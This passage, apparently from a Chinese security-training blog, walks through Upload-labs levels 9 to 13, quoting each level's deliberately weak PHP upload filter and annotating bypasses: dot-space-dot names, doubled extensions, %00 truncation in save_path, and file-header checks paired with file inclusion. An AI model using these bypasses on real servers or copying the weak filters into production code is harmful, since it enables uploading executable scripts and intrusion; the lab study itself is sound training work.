class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1000</span>,<span class="hljs-number">9999</span>).<span class="hljs-variable">$file_ext</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass09-‘加-点-空格-点-绕过’"><a href="#Upload-labs-pass09-‘加-点-空格-点-绕过’" class="headerlink" title="Upload-labs-pass09: ‘加 点 空格 点 绕过’"></a>Upload-labs-pass09: ‘加 点 空格 点 绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;.php&quot;</span>,<span class="hljs-string">&quot;.php5&quot;</span>,<span class="hljs-string">&quot;.php4&quot;</span>,<span class="hljs-string">&quot;.php3&quot;</span>,<span class="hljs-string">&quot;.php2&quot;</span>,<span class="hljs-string">&quot;.html&quot;</span>,<span class="hljs-string">&quot;.htm&quot;</span>,<span class="hljs-string">&quot;.phtml&quot;</span>,<span class="hljs-string">&quot;.pht&quot;</span>,<span class="hljs-string">&quot;.pHp&quot;</span>,<span class="hljs-string">&quot;.pHp5&quot;</span>,<span class="hljs-string">&quot;.pHp4&quot;</span>,<span class="hljs-string">&quot;.pHp3&quot;</span>,<span class="hljs-string">&quot;.pHp2&quot;</span>,<span class="hljs-string">&quot;.Html&quot;</span>,<span class="hljs-string">&quot;.Htm&quot;</span>,<span class="hljs-string">&quot;.pHtml&quot;</span>,<span class="hljs-string">&quot;.jsp&quot;</span>,<span class="hljs-string">&quot;.jspa&quot;</span>,<span class="hljs-string">&quot;.jspx&quot;</span>,<span class="hljs-string">&quot;.jsw&quot;</span>,<span class="hljs-string">&quot;.jsv&quot;</span>,<span class="hljs-string">&quot;.jspf&quot;</span>,<span class="hljs-string">&quot;.jtml&quot;</span>,<span class="hljs-string">&quot;.jSp&quot;</span>,<span class="hljs-string">&quot;.jSpx&quot;</span>,<span class="hljs-string">&quot;.jSpa&quot;</span>,<span class="hljs-string">&quot;.jSw&quot;</span>,<span class="hljs-string">&quot;.jSv&quot;</span>,<span class="hljs-string">&quot;.jSpf&quot;</span>,<span class="hljs-string">&quot;.jHtml&quot;</span>,<span class="hljs-string">&quot;.asp&quot;</span>,<span class="hljs-string">&quot;.aspx&quot;</span>,<span class="hljs-string">&quot;.asa&quot;</span>,<span class="hljs-string">&quot;.asax&quot;</span>,<span class="hljs-string">&quot;.ascx&quot;</span>,<span class="hljs-string">&quot;.ashx&quot;</span>,<span class="hljs-string">&quot;.asmx&quot;</span>,<span class="hljs-string">&quot;.cer&quot;</span>,<span class="hljs-string">&quot;.aSp&quot;</span>,<span class="hljs-string">&quot;.aSpx&quot;</span>,<span class="hljs-string">&quot;.aSa&quot;</span>,<span class="hljs-string">&quot;.aSax&quot;</span>,<span class="hljs-string">&quot;.aScx&quot;</span>,<span class="hljs-string">&quot;.aShx&quot;</span>,<span class="hljs-string">&quot;.aSmx&quot;</span>,<span class="hljs-string">&quot;.cEr&quot;</span>,<span class="hljs-string">&quot;.sWf&quot;</span>,<span class="hljs-string">&quot;.swf&quot;</span>,<span class="hljs-string">&quot;.htaccess&quot;</span>);<span class="hljs-comment">//黑名单</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">deldot</span>(<span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//删除文件名末尾的点</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>);<span class="hljs-comment">//取文件后缀</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//转换为小写</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&#x27;::$DATA&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$file_ext</span>);<span class="hljs-comment">//去除字符串::$DATA</span><br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$file_ext</span>); <span class="hljs-comment">//首尾去空</span><br>        <span class="hljs-comment">//观察发现源代码好像没什么区别，但是这个对&#x27;点&#x27;和&#x27;空格&#x27;的检测并不严格，所以我们可以考虑用加&#x27;点&#x27;空格&#x27;点&#x27;的方式绕过，如&#x27;1.php. .&#x27;</span><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;此文件类型不允许上传！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass10-‘双写后缀绕过’"><a href="#Upload-labs-pass10-‘双写后缀绕过’" class="headerlink" title="Upload-labs-pass10: ‘双写后缀绕过’"></a>Upload-labs-pass10: ‘双写后缀绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>);<span class="hljs-comment">//黑名单</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<span class="hljs-comment">//去除字符串首尾处的空白字符</span><br>        <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);<span class="hljs-comment">//去除文件名里存在于黑名单中的后缀</span><br>        <span class="hljs-comment">//观察源码发现 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name);是一个可绕过点，因为它会删除黑名单中的后缀，导致木马文件无法解析，但只检验一次，也就是说我们可以通过双写后缀的方式绕过检测如&#x27;1.pphphp&#x27;</span><br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><h4 id="Upload-labs-pass11-‘-00截断绕过’"><a href="#Upload-labs-pass11-‘-00截断绕过’" class="headerlink" title="Upload-labs-pass11: ‘%00截断绕过’"></a>Upload-labs-pass11: ‘%00截断绕过’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<span class="hljs-comment">//白名单</span><br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<span class="hljs-comment">//取文件后缀</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><span class="hljs-comment">//save_path是一个可控的变量，后面还有一个后缀名要绕过，所以我们使用%00截断，使用bp抓包get传参,在        url后传入&#x27;?save_path=../upload/1.php%00&#x27;</span><br>        <span class="hljs-comment">//tips:若要使用%00截断要满足两个条件</span><br>        <span class="hljs-comment">/*php版本小于5.3.4</span><br><span class="hljs-comment">        /*php的magic_quotes_gpc为OFF状态 */</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//substr(string $string, int $offset, ?int $length = null): string</span><br><span class="hljs-comment">/*返回字符串 string 由 offset 和 length 参数指定的子字符串</span><br><span class="hljs-comment">offset:</span><br><span class="hljs-comment">如果 offset 是非负数，返回的字符串将从 string 的 offset 位置开始，从 0 开始计算。例如，在字符串 &quot;abcdef&quot; 中，在位置 0 的字符是 &quot;a&quot;，位置 2 的字符串是 &quot;c&quot; 等等。 </span><br><span class="hljs-comment">如果 offset 是负数，返回的字符串将从 string 结尾处向前数第 offset 个字符开始。 </span><br><span class="hljs-comment">如果 string 的长度小于 offset，将返回空字符串。</span><br><span class="hljs-comment">length:</span><br><span class="hljs-comment">如果提供了正数的 length，返回的字符串将从 offset 处开始最多包括 length 个字符（取决于 string 的长度）。 </span><br><span class="hljs-comment">如果提供了负数的 length，那么 string 末尾处的 length 个字符将会被省略（若 offset 是负数则从字符串尾部算起）。如果 offset 不在这段文本中，那么将返回空字符串。 </span><br><span class="hljs-comment">如果提供了值为 0 的 length，那么将返回一个空字符串。 </span><br><span class="hljs-comment">如果忽略 length 或为 null，返回的子字符串将从 offset 位置开始直到字符串结尾。*/</span><br><br><span class="hljs-comment">//strpos(string $haystack, string $needle, int $offset = 0): int|false</span><br><span class="hljs-comment">/*返回 needle 在 haystack 中首次出现的数字位置。*/</span><br><br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass12-‘-00截断绕过升级版’"><a href="#Upload-labs-pass12-‘-00截断绕过升级版’" class="headerlink" title="Upload-labs-pass12: ‘%00截断绕过升级版’"></a>Upload-labs-pass12: ‘%00截断绕过升级版’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<span class="hljs-comment">//白名单</span><br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<span class="hljs-comment">//取文件后缀</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><span class="hljs-comment">//对比上一题的%00截断题，发现save_path参数变成POST传参，因为POST提交的参数不会经过URL编码，所以我们使用bp的快捷编码，选中%00右键conert selection进行快速url编码，其他思路同pass11,但是POST传参</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Upload-labs-pass13-‘文件上传配合文件包含漏洞’"><a href="#Upload-labs-pass13-‘文件上传配合文件包含漏洞’" class="headerlink" title="Upload-labs-pass13: ‘文件上传配合文件包含漏洞’"></a>Upload-labs-pass13: ‘文件上传配合文件包含漏洞’</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>);<span class="hljs-comment">//储存文件头到$strInfo    </span><br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]);<span class="hljs-comment">//对文件头转十进制再储存</span><br>    <br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;      <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getReailFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//fopen(string $filename,string $mode,bool $use_include_path = false,?resource $context = null): resource|false</span><br><span class="hljs-comment">/*打开文件或者 URL,fopen() 将 filename 指定的名字资源绑定到一个流上。 </span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//fread(resource $stream, int $length): string|false</span><br><span class="hljs-comment">/*fread() 从文件指针 stream 读取最多 length 个字节。该函数在遇上以下几种情况时停止读取文件： </span><br><span class="hljs-comment">◦ 读取了 length 个字节  </span><br><span class="hljs-comment">◦ 到达了文件末尾（EOF）</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//fclose(resource $stream): bool</span><br><span class="hljs-comment">/*将 stream 指向的文件关闭。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//unpack(string $format, string $string, int $offset = 0): array|false</span><br><span class="hljs-comment">/*从二进制字符串中解压缩数据，解压缩的数据存储在关联数组中。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">//intval(mixed $value, int $base = 10): int</span><br><span class="hljs-comment">/*通过使用指定的进制 base 转换（默认是十进制），返回变量 value 的 int 数值。 